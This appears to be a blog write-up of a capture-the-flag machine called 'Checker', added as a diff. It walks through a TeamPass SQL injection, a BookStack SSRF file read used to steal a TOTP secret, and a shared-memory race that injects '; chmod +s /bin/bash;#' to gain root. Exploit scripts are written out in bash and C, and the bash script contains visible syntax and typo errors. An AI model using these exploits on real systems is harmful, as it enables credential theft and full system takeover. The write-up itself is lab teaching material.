@@ -1,0 +1,311 @@
+---
+layout: post
+title: "Checker 1eab952552918014a431c736eae89e54"
+date:   2025-07-17 12:05:57 -0400
+categories: writeups
+---
+
+# Checker
+
+# 1. Enumeration
+
+As always we start with nmap, there are three ports open
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image.png' | relative_url }})
+
+In port 80 there is a bookstack login, default credentials do not work, we cannot register a new user
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_1.png' | relative_url }})
+
+We also can reset passwords
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_2.png' | relative_url }})
+
+TeamPass service is running on port 8080
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_3.png' | relative_url }})
+
+Search a little bit to find a vulnerability
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_4.png' | relative_url }})
+
+We don’t have any teampass version disclosed, but a poc of CVE-2023-1545 is present in here and we don’t lose anything if we try
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_5.png' | relative_url }})
+
+It is performing a sql injection giving it a new fake file that is not saved in the database but is compiled with the purpose of spoof the list of valid users, making a login as admin with a lure hash, extracting all users directly from the database.
+
+```bash
+#Check number of arguments
+if [ "$#" -lt 1]; then
+	#Output the name of the script
+	echo "Usage: $0 <base-url>" 
+	exit 1
+fi
+
+#Set vulnerable endpoint
+vulnerable_url="$1/api/index.php/authorize"
+
+#Check if the api is enabled
+check=$(curl --silent "$vulnerable_url")
+if echo "$check" | grep -q "API usage is not allowed"; then
+	echo "API feature no enabled, not vulnerable"
+	exit 1
+fi
+
+#Define a random bcrypt hash to act as lure
+#htpasswd -bnBC 10 "" pwned | tr -d ':\n'
+random_hash='randomhash'
+
+exec_sql() {
+	#SELECT * FROM invitados WHERE nombre = 'none'
+	#UNION
+	#SELECT this is admin info FROM users WHERE login='admin'
+	inject="none' UNION SELECT id, '$random_hash', ($1), private_key, personal_folder, fonction_id, groupes_interdits, 'foo' FROM temapass_users WHERE login='admin'"
+	data="{\"login\":\""$inject\"",\"password\":\"newpass\",\"apikey\":\"foo\"}"
+	token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url | jq -r '.token'")
+}
+
+#$Change $1 with the query replaced with public key
+users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")
+
+echo "There are $users users in the system:"
+
+for i in `seq 0 $(($users-1))`; do
+	username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != ORDER BY login ASC LIMIT $i,1")
+	password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
+	echo "$username:$password"
+done
+```
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_6.png' | relative_url }})
+
+# 2. User flag
+
+Once we have admin user, we can crack it with john
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_7.png' | relative_url }})
+
+In team pass dashboard there are more bob’s passwords 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_8.png' | relative_url }})
+
+This seems interesting, let’s try to login in ssh
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_9.png' | relative_url }})
+
+It has 2FA and we need a verification code 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_10.png' | relative_url }})
+
+Stand a little and check port 80 where is the bookstack framework and we have access thanks to the previous findings, we can create books on it
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_11.png' | relative_url }})
+
+In the source code the version is disclosed
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_12.png' | relative_url }})
+
+It seems to be vulnerable to CVE-2023-6199 Local File Reading via Blind Server Side Request Forgery
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_13.png' | relative_url }})
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_14.png' | relative_url }})
+
+The attacker must have writer permissions. As we saw before bob can create and delete books
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_15.png' | relative_url }})
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_16.png' | relative_url }})
+
+Searching around internet there is a way to enable 2FA through ssh via google-authenticator
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_17.png' | relative_url }})
+
+It says a secret necessary for the verification code is in ~/google-authenticator. We may try to generate our own verification code through this secret
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_18.png' | relative_url }})
+
+`/ajax/page/<id>/save-draft` could be the endpoint for expose the file we need
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_19.png' | relative_url }})
+
+It’s time to find a PoC of concept to perform this attack.
+
+According with this blog post, we can use php_filter_chains_oracle_exploit to abuse this vulnerability.
+
+https://fluidattacks.com/es/blog/lfr-via-blind-ssrf-book-stack
+
+Basically this version of bookstack is using intervention image library which handles with images, it is taking all images that are present in the html source, uploading them to the server and converting the source to an url
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_20.png' | relative_url }})
+
+Then it is getting the file extension and storing the image into a repo and the url is returned
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_21.png' | relative_url }})
+
+If we get deeper understanding of how it is uploading the image we might be able to trick the server to disclose information 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_22.png' | relative_url }})
+
+The function make can take a url, a path or a binary like it is usually here
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_23.png' | relative_url }})
+
+Driver in charge to init the image is sending a GET request to the given url to load the image, we have full control over this url
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_24.png' | relative_url }})
+
+There is a method to use a `php://` wrapper to filter contents we can learn more of this here:
+
+https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle
+
+Now it is time to exploit this, capture the request performed by the following endpoint
+
+`/BookStack/public/ajax/page/7/save-draft`
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_25.png' | relative_url }})
+
+Get the authorization cookies needed for this
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_26.png' | relative_url }})
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_27.png' | relative_url }})
+
+Use the next exploit setting necessary flags using `/etc/passwd` as a test file to see that it is working properly, we can use the proxy to have more control over what is happening
+
+[https://github.com/synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit)
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_28.png' | relative_url }})
+
+Forward all requests
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_29.png' | relative_url }})
+
+Now that we know this is a valid vector attack, we need to find a way to get the OTP secret, in a book created previously for bob there are clues for the home directory 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_30.png' | relative_url }})
+
+connect the dots and access the `.google_authenticator` file with the secret
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_31.png' | relative_url }})
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_32.png' | relative_url }})
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_33.png' | relative_url }})
+
+Now use TOTP web application to enter the secret and get the verification code 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_34.png' | relative_url }})
+
+That’s how we get the user flag
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_35.png' | relative_url }})
+
+# 3.Priv esc
+
+Use `sudo -l` to see binaries allowed to run as root
+
+`Check-leak.sh` is allowed to run as root, it is a custom script that given a username it sanitize the input keeping only alphanumeric characters and use a binary to determine if the username was leaked or not
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_36.png' | relative_url }})
+
+Download `cheack_leak` binary to inspect it meticulously 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_37.png' | relative_url }})
+
+Use FreeIDA software for this task, identify main function
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_38.png' | relative_url }})
+
+This function is checking leaked hashes in a file, if the password is leaked open a shared memory location to execute a command querying the information for the hash in the database
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_39.png' | relative_url }})
+
+Here we have the `write_to_shm` function, we can notice how the address memory is chosen, it takes the current time, initializes the random function taking time as seed, and generates a pseudo-random number between 0-0xFFFFF (1048575). Then it try to access to that memory address and gets a pointer for it. A message is written in this memory address with the time and hash 
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_40.png' | relative_url }})
+
+This memory location is used for the notify user function
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_41.png' | relative_url }})
+
+This function assure the string “Leaked hash detected” is present in this memory address, then the pointer is set to point the message from the ASCII 62 (>)
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_42.png' | relative_url }})
+
+Set the pointer after the (>) cut and clean and verify the hash
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_43.png' | relative_url }})
+
+With this the mysql query is performed
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_44.png' | relative_url }})
+
+Here we have a clear view of what notify user is doing with its key points
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_45.png' | relative_url }})
+
+It’s time to use all this information to create a exploit that inject the memory address with the information we want the query to execute, use the same structure to create the seed, verify the memory reservation and access the pointer to inject the message. We can use pure C or C libraries in python
+
+```c
+#include <stdio.h>
+#include <time.h>
+#include <stdlib.h>
+#include <sys/ipc.h> //Key_t
+#include <sys/shm.h> //sh *
+#include <string.h>
+
+int main() {
+	//Get time
+	unsigned int v4 =(unsigned int)time(NULL);
+	//Init randomic function
+	srand(v4);
+	
+	key_t key = rand() % 0xFFFFF;
+	
+	//Create shared memory and check
+		int shmid = shmget(key, 0x400, IPC_CREAT | 0666);
+	if (shmid < 0) {
+		perror("shmget failed");
+		return 1;
+	}
+	
+	// attach shared memory and gets its pointer
+	char *share_memory = (char *)shmat(shmid, NULL, 0);
+	if (share_memory == (char *)-1){
+		perror("shmat failed");
+		return 1;
+	}
+	
+	const char *message = "Leaked hash detected > '; chmod +s /bin/bash;#";
+	//Inject memory
+	snprintf(share_memory,0x400,"%s", message);
+	
+	printf("Message in shared memory: %s\n", share_memory);
+	
+	//detach shared memory
+	if (shmdt(share_memory) == -1){
+		perror("shmdt failed");
+		return 1;
+	}
+	
+	return 0;
+}
+
+```
+
+Compile the script and create a loop to be injecting the generated memory address
+
+```python
+gcc -o output script.c
+
+```
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_46.png' | relative_url }})
+
+Run the sudo command and verify that the setuid was applied correctly
+
+![image.png]({{ '/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_47.png' | relative_url }})
+
+Machine pwned!!!!
